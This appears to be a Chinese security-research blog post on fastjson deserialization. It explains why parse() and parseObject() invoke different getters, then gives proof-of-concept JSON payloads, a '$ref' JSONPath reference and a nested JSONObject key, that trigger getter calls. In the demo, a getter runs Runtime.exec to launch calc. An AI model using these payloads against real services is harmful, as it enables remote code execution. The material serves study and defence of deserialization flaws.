# fastjson之parse和parseobject利用差异-先知社区

> **来源**: https://xz.aliyun.com/news/16117  
> **文章ID**: 16117

---

# fastjson之parse和parseobject利用差异

## parse和parseobject区别

### 结论

FastJson中的 parse() 和 parseObject()方法都可以用来将JSON字符串反序列化成Java对象，parseObject() 本质上也是调用 parse() 进行反序列化的。但是 parseObject() 会额外的将Java对象转为 JSONObject对象，即 JSON.toJSON()。所以进行反序列化时的细节区别在于，parse() 会识别并调用目标类的 setter 方法及某些特定条件的 getter 方法，而 parseObject() 由于多执行了 JSON.toJSON(obj)，所以在处理过程中会调用反序列化目标类的所有 setter 和 getter 方法。--- 引用<https://jlkl.github.io/2021/12/18/Java_07/>

上面说的条件：返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong的getter方法

### 分析

测试代码

```
package demo2;

import com.alibaba.fastjson.JSON;

import java.io.IOException;

public class FastJsonTest {

    public String name;
    public String age;
    public FastJsonTest() {
    }

    public void setName(String test) {
        System.out.println("name setter called");
        this.name = test;
    }

    public String getName() {
        System.out.println("name getter called");
        return this.name;
    }

    public String getAge(){
        System.out.println("age getter called");
        return this.age;
    }

    public static void main(String[] args) {
//        Object obj = JSON.parse("{\"@type\":\"demo2.FastJsonTest\",\"name\":\"thisisname\", \"age\":\"thisisage\"}");
//        System.out.println(obj);

        Object obj2 = JSON.parseObject("{\"@type\":\"demo2.FastJsonTest\",\"name\":\"thisisname\", \"age\":\"thisisage\"}");
        System.out.println(obj2);
    }

}

```

执行parse() 时，只有 setName() 会被调用。执行parseObject() 时，setName()、getAge()、getName() 均会被调用。

#### parse() 分析

为什么能够调用setter和getter方法核心在createJavaBeanDeserializer方法，因为我们反序列化bean的时候是使用JavaBeanDeserializer去反序列化，而创建它的过程中我们看到javaBeaninfo的build方法  
在这里先获取我们的get方法，但是只有我们的返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong的getter方法

![](images/20241206124949-86214b8a-b38d-1.png)

所以这也是只能调用这些getter方法的原因  
我们看看setter方法，是没有什么限制的，只要是个setter方法就ok

![](images/20241206125023-9a3ea57c-b38d-1.png)

然后看到这里我们就可以想一个问题了  
**为什么会触发getOutputProperties()**

感觉上 parse() 进行反序列化创建Java类应该只会调用 setter 方法进行成员变量赋值才对，会什么会触发TemplatesImpl类中的 getOutputProperties() 方法呢？

另外 \_outputProperties 成员变量和 getOutputProperties() 明明差了一个\_字符，是怎么被 FastJson 关联上的?  
可以看到处理逻辑是如果是有\_就从第4位开始截取的

#### parseObject()分析

为什么它能够调用到全部的setter方法呢？在build步骤是一样的，没有什么区别，关键在这个方法，我们跟进看看

先看看调用栈

```
getName:20, FastJsonTest (demo2)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:497, Method (java.lang.reflect)
get:451, FieldInfo (com.alibaba.fastjson.util)
getPropertyValue:114, FieldSerializer (com.alibaba.fastjson.serializer)
getFieldValuesMap:439, JavaBeanSerializer (com.alibaba.fastjson.serializer)
toJSON:902, JSON (com.alibaba.fastjson)
toJSON:824, JSON (com.alibaba.fastjson)
parseObject:206, JSON (com.alibaba.fastjson)
main:33, FastJsonTest (demo2)**加粗样式**

```

原因还是那句话  
**FastJson中的 parse() 和 parseObject()方法都可以用来将JSON字符串反序列化成Java对象，parseObject() 本质上也是调用 parse() 进行反序列化的。但是 parseObject() 会额外的将Java对象转为 JSONObject对象，即 JSON.toJSON()**  
所以会调用到目标类的getter方法

## Fastjson parse突破特殊getter调用限制

了解了上面的知识，所以就会引来一个问题，如果我们底层调用的是parse来解析我们的json格式的，那我们是不是就不能利用一些调用链了

### $ref引用

条件限制  
jdk版本限制  
fastjson>=1.2.36  
开启Autotype

#### 测试代码

```
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class Main {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

        String payload =
                "[{\"@type\":\"demo2.User\",\"cmd\":\"calc\"},{\"@type\":\"demo2.User\",\"cmd\":\"notepad.exe\",\"test\":\"test\"},{\"$ref\":\"$[0].cmd\"}]";
        Object o = JSON.parse(payload);
    }
}

```

```
package demo2;

import java.io.IOException;

public class User {
    private String cmd;
    private String test;

    public String getTest() {
        System.out.println("getTest");
        return test;
    }

    public void setTest(String test) {
        System.out.println("setTest");
        this.test = test;
    }

    public String getCmd() throws IOException {
        Runtime.getRuntime().exec(cmd);
        System.out.println("getcmd");
        return cmd;
    }

    public void setCmd(String cmd) {
        System.out.println("setcmd");
        this.cmd = cmd;
    }
}

```

运行main类弹出计算机

#### 分析调试

首先我们学习一下这个引用  
基本语法：  
JSON 引用（$ref）：允许在 JSON 数据中引用已经解析的对象，避免重复数据

```
"$ref": "$"：引用根对象。
"$ref": "$[0]"：引用根数组的第一个元素。
"$ref": "$.propertyName"：引用根对象的某个属性。

```

明明是谈不了计算机的，结果弹出来了，我们下断点看看过程

```
getCmd:20, User (demo2)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:497, Method (java.lang.reflect)
get:571, FieldInfo (com.alibaba.fastjson.util)
getPropertyValue:151, FieldSerializer (com.alibaba.fastjson.serializer)
getFieldValue:616, JavaBeanSerializer (com.alibaba.fastjson.serializer)
getPropertyValue:3873, JSONPath (com.alibaba.fastjson)
eval:2354, JSONPath$PropertySegment (com.alibaba.fastjson)
eval:121, JSONPath (com.alibaba.fastjson)
handleResovleTask:1599, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:183, JSON (com.alibaba.fastjson)
parse:191, JSON (com.alibaba.fastjson)
parse:147, JSON (com.alibaba.fastjson)
main:10, Main

```

我们看到在Object value = parser.parse();就已经解析了我们的value，也调用了相应的setter方法赋值了

![](images/20241206125104-b2b4b042-b38d-1.png)

之后调用handleResolveTask就和这个名字一样的意思  
处理 JSON 解析过程中出现的引用解析任务（Resolve Task）。这些任务通常涉及到 JSONPath 引用（例如 `$ref`）的解析和处理  
判断$开头的，然后去实例化我们的JSONPath的eval方法去解析我们的value

![](images/20241206125118-bb189898-b38d-1.png)

看到eval方法  
设置主类，然后调用eval继续去处理

![](images/20241206125139-c789a856-b38d-1.png)

我们的sagment如下

![](images/20241206125149-cd99fb42-b38d-1.png)  
继续调用eval

![](images/20241206125200-d405b0a2-b38d-1.png)

根据传入的String调用get方法

#### 低版本不能使用原因

需要refValue不为null，并且refValue必须是JSONObject类。如下图

![](images/20241206125304-fa75231c-b38d-1.png)

### 通过JSONObject调用

#### 小插曲

下面给出代码

```
package demo2;

import com.alibaba.fastjson.JSON;


public class Test {
    private String id;

    public String getId() {
        System.out.println("getID");
        return id;
    }

    public void setId(String id) {
        System.out.println("setID");
        this.id = id;
    }

    public static void main(String[] args) {

        String payload = "[{\"@type\":\"demo2.Test\",\"id\":\"123\"}]";
        Object o = JSON.parse(payload);
        System.out.println(o);
    }
}

```

发现竟然调用了我们的get方法  
这是为什么？  
其实是因为我已经把他变成数组了，仔细看外面多了一层[]把我们的数据变成了数组

结果是  
由于打印的是一个数组对象，数组的 toString() 方法会递归地调用每个元素的 toString() 方法。由于 Test 类没有重写 toString() 方法，这会调用 JSON.toJSONString(o) 来转换对象为 JSON 字符串，这个过程会调用 getId 方法来获取 id 属性值，故打印 getID。

```
getId:11, Test (demo2)
write:-1, ASMSerializer_1_Test (com.alibaba.fastjson.serializer)
write:135, ListSerializer (com.alibaba.fastjson.serializer)
write:312, JSONSerializer (com.alibaba.fastjson.serializer)
toJSONString:1077, JSON (com.alibaba.fastjson)
toString:1071, JSON (com.alibaba.fastjson)
valueOf:2994, String (java.lang)
println:821, PrintStream (java.io)
main:24, Test (demo2)

```

发现确实是在print那里调用的，是把我们的字符串打印的时候是把我们的array对象打印出来

![](images/20241206125317-02380b00-b38e-1.png)

所以其实这也给了我们一个提示，我们是不是找一个tostring，把我们的字符串还原为我们的对象的过程

Fastjson使用ASM来代替反射，通过ASM的ClassWriter来生成JavaBeanSerializer的子类，重写write方法，JavaBeanSerializer中的write方法会使用反射从JavaBean中获取相关信息，ASM针对不同类会生成独有的序列化工具类，这里如ASMSerializer\_1\_Test ，也会调用getter获取类种相关信息

#### 正经过程

##### 测试代码

```
package demo2;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;


public class Test {
    private String id;

    public String getId() {
        System.out.println("getID");
        return id;
    }

    public void setId(String id) {
        System.out.println("setID");
        this.id = id;
    }

    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"aaa\":{\"@type\":\"demo2.Test\",\"id\":\"123\"}}";
        Object o = JSON.parse(payload);
        System.out.println(o);
    }
}

```

##### 分析调试

巧妙利用了JSONObject.toString ，JSONObject 继承了JSON抽象类

com.alibaba.fastjson.JSON#toString，进行序列化操作，object 转 str

那么我们只要在反序列化过程中，找到一处可以使用JSONObject调用toString的地方就可以了

com.alibaba.fastjson.parser.DefaultJSONParser#parseObject  
会调用我们的key的Tostring

![](images/20241206125343-11dd40de-b38e-1.png)

Fastjson在解析的时候如果遇到{，会加一层JSONObject，那么只需将key构造成JSONObject，类似{{some}:x} 即可

![](images/20241206125356-199bf5ae-b38e-1.png)

##### 为什么大于1.2.36版本不行

com.alibaba.fastjson.parser.DefaultJSONParser#parse中直接入口点掐了，不再调用toString函数
